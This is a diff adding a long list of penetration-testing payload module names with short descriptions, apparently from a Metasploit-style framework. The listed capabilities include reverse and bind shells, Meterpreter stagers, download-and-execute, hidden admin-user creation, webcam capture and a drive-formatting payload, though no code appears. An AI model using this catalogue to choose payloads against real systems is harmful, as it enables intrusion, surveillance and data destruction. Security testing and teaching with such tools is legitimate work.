+    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH
+    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option
+    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)
+    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh
+    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.
+    cmd/windows/adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
+    cmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua
+    cmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)
+    cmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)
+    cmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby
+    cmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.
+    cmd/windows/download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it
+    cmd/windows/generic                                 Executes the supplied command
+    cmd/windows/powershell_bind_tcp                     Interacts with a powershell session on an established socket connection
+    cmd/windows/powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection
+    cmd/windows/reverse_lua                             Creates an interactive shell via Lua
+    cmd/windows/reverse_perl                            Creates an interactive shell via perl
+    cmd/windows/reverse_powershell                      Connect back and create a command shell via Powershell
+    cmd/windows/reverse_ruby                            Connect back and create a command shell via Ruby
+    firefox/exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript "launcher" to disk that hides the prompt.
+    firefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API
+    firefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API
+    generic/custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.
+    generic/debug_trap                                  Generate a debug trap in the target process
+    generic/shell_bind_tcp                              Listen for a connection and spawn a command shell
+    generic/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    generic/tight_loop                                  Generate a tight loop in the target process
+    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
+    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
+    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
+    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
+    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
+    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
+    java/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
+    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
+    java/shell_reverse_tcp                              Connect back to attacker and spawn a command shell
+    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
+    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
+    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
+    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
+    linux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker
+    linux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
+    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
+    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
+    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/armbe/shell_bind_tcp                          Listen for a connection and spawn a command shell
+    linux/armle/adduser                                 Create a new user with UID 0
+    linux/armle/exec                                    Execute an arbitrary command
+    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection
+    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker
+    linux/armle/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/armle/shell/bind_tcp                          dup2 socket in r12, then execve. Listen for a connection
+    linux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker
+    linux/armle/shell_bind_tcp                          Connect to target and spawn a command shell
+    linux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
+    linux/mips64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
+    linux/mips64/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
+    linux/mips64/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.
+    linux/mipsbe/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker
+    linux/mipsbe/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsbe/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executing other payloads that rely on initial startup procedures.
+    linux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
+    linux/mipsbe/shell_bind_tcp                         Listen for a connection and spawn a command shell
+    linux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
+    linux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.
+    linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker
+    linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
+    linux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.
+    linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
+    linux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell
+    linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
+    linux/ppc/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    linux/ppc/shell_find_port                           Spawn a shell on an established connection
+    linux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/ppc64/shell_bind_tcp                          Listen for a connection and spawn a command shell
+    linux/ppc64/shell_find_port                         Spawn a shell on an established connection
+    linux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
+    linux/ppc64le/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc64le/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppc64le/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppce500v2/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppce500v2/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
+    linux/ppce500v2/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/exec                                      Execute an arbitrary command
+    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
+    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/x64/pingback_bind_tcp                         Accept a connection from attacker and report UUID (Linux x64)
+    linux/x64/pingback_reverse_tcp                      Connect back to attacker and report UUID (Linux x64)
+    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
+    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    linux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell
+    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
+    linux/x64/shell_find_port                           Spawn a shell on an established connection
+    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
+    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/x86/adduser                                   Create a new user with UID 0
+    linux/x86/chmod                                     Runs chmod on specified file with specified mode
+    linux/x86/exec                                      Execute an arbitrary command
+    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
+    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection
+    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)
+    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
+    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection
+    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
+    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
+    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
+    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
+    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
+    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
+    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
+    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
+    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
+    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
+    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
+    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
+    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
+    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
+    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
+    linux/x86/shell_find_port                           Spawn a shell on an established connection
+    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
+    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
+    linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
+    linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
+    linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
+    mainframe/shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
+    multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
+    multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
+    netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
+    nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
+    nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
+    nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
+    osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
+    osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
+    osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
+    osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
+    osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
+    osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
+    osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.
+    osx/ppc/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection
+    osx/ppc/shell/find_tag                              Spawn a command shell (staged). Use an established connection
+    osx/ppc/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker
+    osx/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
+    osx/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    osx/x64/dupandexecve/bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute
+    osx/x64/dupandexecve/reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute
+    osx/x64/dupandexecve/reverse_tcp_uuid               dup2 socket in edi, then execve. Connect back to the attacker with UUID Support (OSX x64)
+    osx/x64/exec                                        Execute an arbitrary command
+    osx/x64/meterpreter/bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute
+    osx/x64/meterpreter/reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute
+    osx/x64/meterpreter/reverse_tcp_uuid                Inject the mettle server payload (staged). Connect back to the attacker with UUID Support (OSX x64)
+    osx/x64/meterpreter_reverse_http                    Run the Meterpreter / Mettle server payload (stageless)
+    osx/x64/meterpreter_reverse_https                   Run the Meterpreter / Mettle server payload (stageless)
+    osx/x64/meterpreter_reverse_tcp                     Run the Meterpreter / Mettle server payload (stageless)
+    osx/x64/say                                         Say an arbitrary string outloud using Mac OS X text2speech
+    osx/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port
+    osx/x64/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)
+    osx/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    osx/x86/bundleinject/bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute
+    osx/x86/bundleinject/reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute
+    osx/x86/exec                                        Execute an arbitrary command
+    osx/x86/isight/bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute
+    osx/x86/isight/reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute
+    osx/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell
+    osx/x86/shell_find_port                             Spawn a shell on an established connection
+    osx/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+    osx/x86/vforkshell/bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute
+    osx/x86/vforkshell/reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute
+    osx/x86/vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell
+    osx/x86/vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell
+    php/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)
+    php/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6
+    php/bind_php                                        Listen for a connection and spawn a command shell via php
+    php/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)
+    php/download_exec                                   Download an EXE from an HTTP URL and execute it
+    php/exec                                            Execute a single system command
+    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection
+    php/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6
+    php/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support
+    php/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support
+    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
+    php/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
+    php/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)
+    php/reverse_perl                                    Creates an interactive shell via perl
+    php/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions
+    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.
+    python/meterpreter/bind_tcp                         Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection
+    python/meterpreter/bind_tcp_uuid                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection with UUID Support
+    python/meterpreter/reverse_http                     Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP
+    python/meterpreter/reverse_https                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP using SSL
+    python/meterpreter/reverse_tcp                      Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker
+    python/meterpreter/reverse_tcp_ssl                  Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Reverse Python connect back stager using SSL
+    python/meterpreter/reverse_tcp_uuid                 Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker with UUID Support
+    python/meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell
+    python/meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell
+    python/meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell
+    python/meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell
+    python/pingback_bind_tcp                            Listens for a connection from the attacker, sends a UUID, then terminates
+    python/pingback_reverse_tcp                         Connects back to the attacker, sends a UUID, then terminates
+    python/shell_bind_tcp                               Creates an interactive shell via python, encodes with base64 by design
+    python/shell_reverse_tcp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3
+    python/shell_reverse_tcp_ssl                        Creates an interactive shell via python, uses SSL, encodes with base64 by design.
+    python/shell_reverse_udp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3
+    r/shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R
+    r/shell_reverse_tcp                                 Connect back and create a command shell via R
+    ruby/pingback_bind_tcp                              Listens for a connection from the attacker, sends a UUID, then terminates
+    ruby/pingback_reverse_tcp                           Connect back to the attacker, sends a UUID, then terminates
+    ruby/shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby
+    ruby/shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby
+    ruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby
+    ruby/shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL
+    solaris/sparc/shell_bind_tcp                        Listen for a connection and spawn a command shell
+    solaris/sparc/shell_find_port                       Spawn a shell on an established connection
+    solaris/sparc/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
+    solaris/x86/shell_bind_tcp                          Listen for a connection and spawn a command shell
+    solaris/x86/shell_find_port                         Spawn a shell on an established connection
+    solaris/x86/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
+    tty/unix/interact                                   Interacts with a TTY on an established socket connection
+    windows/adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
+    windows/dllinject/bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
+    windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
+    windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
+    windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
+    windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
+    windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
+    windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
+    windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
+    windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
+    windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
+    windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
+    windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
+    windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
+    windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
+    windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
+    windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
+    windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
+    windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
+    windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
+    windows/dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload
+    windows/download_exec                               Download an EXE from an HTTP(S)/FTP URL and execute it
+    windows/encrypted_shell/reverse_tcp                 Spawn a piped command shell (staged). Connect to MSF and read in stage
+    windows/encrypted_shell_reverse_tcp                 Connect back to attacker and spawn an encrypted command shell
+    windows/exec                                        Execute an arbitrary command
+    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reason, it skips the drive and proceeds to the next volume.
+    windows/loadlibrary                                 Load an arbitrary library path
+    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
+    windows/meterpreter/bind_hidden_ipknock_tcp         Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
+    windows/meterpreter/bind_hidden_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
+    windows/meterpreter/bind_ipv6_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection (Windows x86)
+    windows/meterpreter/bind_ipv6_tcp_uuid              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
+    windows/meterpreter/bind_named_pipe                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a pipe connection (Windows x86)
+    windows/meterpreter/bind_nonx_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (No NX)
+    windows/meterpreter/bind_tcp                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (Windows x86)
+    windows/meterpreter/bind_tcp_rc4                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection
+    windows/meterpreter/bind_tcp_uuid                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection with UUID Support (Windows x86)
+    windows/meterpreter/find_tag                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Use an established connection
+    windows/meterpreter/reverse_hop_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
+    windows/meterpreter/reverse_http                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows wininet)
+    windows/meterpreter/reverse_http_proxy_pstore       Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP
+    windows/meterpreter/reverse_https                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows wininet)
+    windows/meterpreter/reverse_https_proxy             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP using SSL with custom proxy support
+    windows/meterpreter/reverse_ipv6_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker over IPv6
+    windows/meterpreter/reverse_named_pipe              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker via a named pipe pivot
+    windows/meterpreter/reverse_nonx_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker (No NX)
+    windows/meterpreter/reverse_ord_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+    windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+    windows/meterpreter/reverse_tcp_allports            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/meterpreter/reverse_tcp_dns                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+    windows/meterpreter/reverse_tcp_rc4                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+    windows/meterpreter/reverse_tcp_rc4_dns             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
+    windows/meterpreter/reverse_tcp_uuid                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker with UUID Support
+    windows/meterpreter/reverse_winhttp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows winhttp)
+    windows/meterpreter/reverse_winhttps                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows winhttp)
+    windows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell
+    windows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell
+    windows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
+    windows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
+    windows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell
+    windows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell
+    windows/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service
+    windows/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service
